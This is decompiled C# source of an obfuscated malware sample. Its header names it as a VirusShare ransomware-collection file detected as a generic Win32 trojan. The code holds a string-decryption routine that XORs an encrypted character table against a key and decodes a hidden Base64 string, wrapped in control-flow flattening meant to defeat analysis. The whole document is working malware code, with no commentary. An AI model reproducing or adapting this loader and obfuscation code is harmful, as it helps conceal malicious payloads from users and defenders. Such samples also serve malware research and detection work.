// Decompiled with JetBrains decompiler
// Type: Class1
// Assembly: SyncuiLoaeer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 059388F9-BBF4-421E-BCD6-B0AFD3B01313
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-42cfbee1dc005e428388ab62313c9fd4643e481f63d030066df90aa925b48883.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

[StandardModule]
public sealed class Class1
{
  private static readonly char[] Ⴗ;
  private static readonly char[] Ⴈ;
  private static readonly string[] Ⴃ;
  internal static Class1.Ⴍ Ⴀ;

  public static string main(string s)
  {
label_3:
    string s1 = Class1.Ⴄ(1184220534, 7);
    string[] strArray = global::Ⴃ.Ⴈ.Ⴅ.Ⴃ(s, Class1.Ⴄ(1184220272, 0), -1, CompareMethod.Binary, 236, 229);
    int num = 9;
    int index;
    bool flag;
    while (true)
    {
      switch (num)
      {
        case 0:
          num = flag ? 5 : 7;
          continue;
        case 1:
          flag = index < strArray.Length;
          goto case 0;
        case 2:
        case 7:
          goto label_9;
        case 3:
          goto label_3;
        case 5:
        case 8:
          string str = strArray[index];
          s1 = global::Ⴃ.Ⴐ(s1, global::Ⴃ.Ⴈ.Ⴅ.Ⴍ(Class1.Ⴅ(checked ((int) global::Ⴃ.Ⴈ.Ⴐ(global::Ⴃ.Ⴈ.Ⴓ(global::Ⴃ.Ⴐ(Class1.Ⴄ(1184220275, 7), str, 403, 401), 656, 675), 454, 432)), 777, 769), 469, 473), 1006, 1004);
          num = 6;
          continue;
        case 6:
          checked { ++index; }
          num = 1;
          continue;
        case 9:
          index = 0;
          num = 1;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (Class1.main);
          num = 3;
          continue;
      }
    }
label_9:
    return Encoding.UTF8.GetString(Convert.FromBase64String(s1));
  }

  static Class1()
  {
    int num = 4;
    char[] chArray;
    while (true)
    {
      switch (num)
      {
        case 0:
          chArray[0] = '㲴';
          chArray[5] = '☨';
          goto case 6;
        case 1:
          goto label_8;
        case 2:
          chArray[7] = '╥';
          chArray[2] = 'ℒ';
          Class1.Ⴃ = new string[4];
          num = 7;
          continue;
        case 3:
        case 7:
          goto label_7;
        case 5:
          chArray[4] = 'ᬏ';
          chArray[6] = 'ݷ';
          chArray[3] = 'ࠣ';
          num = 2;
          continue;
        case 6:
          chArray[1] = 'ച';
          num = 5;
          continue;
        default:
          global::Ⴃ.Ⴈ.Ⴄ();
          Class1.Ⴈ = new char[266]
          {
            char.MinValue,
            char.MinValue,
            char.MinValue,
            '\u0001',
            'û',
            char.MinValue,
            'ബ',
            '℡',
            'ࠎ',
            'ᬼ',
            '☛',
            'ݚ',
            '╓',
            '㳷',
            'ഷ',
            '℥',
            'ࠖ',
            'ᬢ',
            '☝',
            'ݎ',
            '╈',
            '㲇',
            'ഩ',
            'ℿ',
            'ࠖ',
            'ᬹ',
            '★',
            '݀',
            '╕',
            '㲙',
            'മ',
            '\u2151',
            'ࠎ',
            'ᬻ',
            '☛',
            'ݚ',
            '║',
            '㲆',
            'ഷ',
            '℡',
            'ࠑ',
            'ᬢ',
            '☝',
            'ܶ',
            '╈',
            '㲁',
            'ഢ',
            'ℿ',
            'ࠗ',
            '\u1B4E',
            '★',
            '݀',
            '┤',
            '㲙',
            'ബ',
            '℣',
            'ࠎ',
            'ᬺ',
            '☟',
            'ݚ',
            '╖',
            '㲍',
            'ഷ',
            '℥',
            'ࠖ',
            'ᬢ',
            '☝',
            '݇',
            '╈',
            '㲁',
            'മ',
            'ℿ',
            'ࠗ',
            'ᬺ',
            '★',
            '݀',
            '═',
            '㲙',
            'മ',
            '\u2156',
            'ࠎ',
            'ᬻ',
            '☛',
            'ݚ',
            '╖',
            '㲀',
            'ഷ',
            '℥',
            'ࠔ',
            'ᬢ',
            '☜',
            'ܴ',
            '╈',
            '㲂',
            '\u0D5B',
            'ℿ',
            'ࠗ',
            'ᬾ',
            '★',
            '݀',
            '╖',
            '㲙',
            'മ',
            'Å',
            'ࠎ',
            'ᬻ',
            '☟',
            'ݚ',
            '║',
            '㳱',
            'ഷ',
            '℡',
            'ࠒ',
            'ᬢ',
            '☞',
            '݅',
            '╈',
            '㲀',
            'ഢ',
            'ℿ',
            'ࠖ',
            'ᬽ',
            '★',
            '݄',
            '╔',
            '㲙',
            'ബ',
            '℡',
            'ࠎ',
            'ᬹ',
            '♬',
            'ݚ',
            '═',
            '㲁',
            'ഷ',
            '℡',
            'ࠚ',
            'ᬢ',
            '☞',
            '݅',
            '╈',
            '㲂',
            '\u0D5E',
            'ℿ',
            'ࠖ',
            'ᬹ',
            '★',
            '݄',
            '╔',
            '㲙',
            'ബ',
            'Ω',
            'ࠎ',
            'ᬻ',
            '☐',
            'ݚ',
            '║',
            '㳵',
            'ഷ',
            'ℤ',
            'ࠛ',
            'ᬢ',
            '☞',
            '݅',
            '╈',
            '㲀',
            'ഩ',
            'ℿ',
            'ࠔ',
            'ᬸ',
            '★',
            '݁',
            '╒',
            '㲙',
            'ബ',
            '℡',
            'ࠎ',
            'ᬻ',
            '☐',
            'ݚ',
            '═',
            '㲂',
            'ഷ',
            'ℤ',
            'ࠚ',
            'ᬢ',
            '☞',
            '݅',
            '╈',
            '㲀',
            'ഭ',
            'ℿ',
            'ࠕ',
            '\u1B4C',
            '★',
            '݁',
            '┤',
            '㲙',
            'ബ',
            '℣',
            'ࠎ',
            'ᬼ',
            '☚',
            'ݚ',
            '═',
            '㲂',
            'ഷ',
            '℡',
            'ࠖ',
            'ᬢ',
            '☞',
            '݃',
            '╈',
            '㲀',
            'ഭ',
            'ℿ',
            'ࠐ',
            'ᬶ',
            '★',
            '݀',
            '╗',
            '㲙',
            'യ',
            '\u2153',
            'ࠎ',
            'ᬺ',
            '☟',
            'ݚ',
            '╖',
            '㲀',
            'ഷ',
            '℡',
            'ࠚ',
            'ᬢ',
            '☞',
            '݅',
            '╈',
            '㲂',
            'ൟ',
            'ℿ',
            'ࠖ',
            'ᬹ',
            '★',
            '݀',
            '╖',
            '㲙',
            'ബ',
            '℠',
            'ࠎ',
            'ᬻ',
            '☙',
            'ݚ',
            '╖',
            '㳰',
            'ഷ',
            '℡',
            '\u0867',
            '\u0002',
            '\u0001',
            char.MinValue,
            'ℿ',
            '\u0003',
            '\u0002',
            char.MinValue,
            'ࠅ',
            '᭧'
          };
          chArray = new char[8];
          num = 0;
          continue;
      }
    }
label_8:
    return;
label_7:
    Class1.Ⴗ = chArray;
  }

  internal static string Ⴄ([In] int obj0, [In] int obj1)
  {
label_3:
    int index1 = obj0 ^ 1184220529 ^ obj1;
    char[] ⴈ = Class1.Ⴈ;
    int index2 = (int) ⴈ[index1];
    int num1 = 6;
    string str;
    int length1;
    char[] chArray;
    char[] ⴗ;
    int length2;
    int index3;
    while (true)
    {
      switch (num1)
      {
        case 1:
          goto label_5;
        case 2:
          index3 = 0;
          num1 = 13;
          continue;
        case 3:
        case 10:
          goto label_3;
        case 4:
          goto label_13;
        case 5:
          chArray[index3] = (char) ((uint) ⴈ[index1 + index3] ^ (uint) ⴗ[(index3 + index2) % length2]);
          num1 = 12;
          continue;
        case 6:
          num1 = (str = Class1.Ⴃ[index2]) == null ? 8 : 1;
          continue;
        case 8:
          int num2 = (int) ⴈ[index1 + 1];
          length1 = ((int) ⴈ[index1 + 2] << 16) + num2;
          num1 = 11;
          continue;
        case 9:
          goto label_12;
        case 11:
          chArray = new char[length1];
          ⴗ = Class1.Ⴗ;
          length2 = ⴗ.Length;
          index1 += 3;
          num1 = 2;
          continue;
        case 12:
          index3 = 1 + index3;
          num1 = 13;
          continue;
        case 13:
          num1 = index3 < length1 ? 5 : 9;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (Class1.Ⴄ);
          num1 = 10;
          continue;
      }
    }
label_5:
    return str;
label_12:
    str = new string(chArray);
    Class1.Ⴃ[index2] = str;
label_13:
    return str;
  }

  internal static char Ⴅ([In] int obj0, [In] int obj1, [In] int obj2)
  {
label_3:
    int num1;
    switch (obj2 ^ obj1)
    {
      case 8:
        num1 = 6;
        break;
      default:
        num1 = 5;
        break;
    }
    int num2 = num1;
    while (true)
    {
      switch (num2)
      {
        case 2:
          goto label_3;
        case 3:
          num2 = 2;
          continue;
        case 4:
        case 5:
          num2 = 2;
          continue;
        case 6:
          goto label_8;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (Class1.Ⴅ);
          num2 = 2;
          continue;
      }
    }
label_8:
    return Strings.ChrW(obj0);
  }

  internal static int Ⴓ([In] BinaryReader obj0, [In] int obj1, [In] int obj2)
  {
label_3:
    int num1;
    switch (obj2 ^ obj1)
    {
      case 88:
        num1 = 5;
        break;
      default:
        num1 = 6;
        break;
    }
    int num2 = num1;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 5:
          goto label_8;
        case 1:
        case 6:
          num2 = 2;
          continue;
        case 2:
          goto label_3;
        case 4:
          num2 = 2;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (Class1.Ⴓ);
          num2 = 2;
          continue;
      }
    }
label_8:
    return obj0.ReadInt32();
  }

  internal static object Ⴜ([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] int obj3)
  {
label_0:
    switch ((obj3 ^ obj2) - 4)
    {
      case 0:
        return obj0.GetData(obj1);
      default:
        goto label_0;
    }
  }

  [StructLayout(LayoutKind.Explicit, Size = 532, Pack = 1)]
  private struct Ⴍ
  {
  }

  internal sealed class Ⴐ
  {
    internal static byte[] Ⴃ([In] BinaryReader obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 90:
          num1 = 3;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_3;
          case 2:
          case 7:
            num2 = 1;
            continue;
          case 3:
          case 6:
            goto label_8;
          case 5:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Class1.Ⴐ.Ⴃ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return obj0.ReadBytes(obj1);
    }

    internal static string Ⴈ([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      switch ((obj3 ^ obj2) - 87)
      {
        case 0:
          return obj0.ToString() + obj1;
        default:
          goto label_0;
      }
    }
  }
}
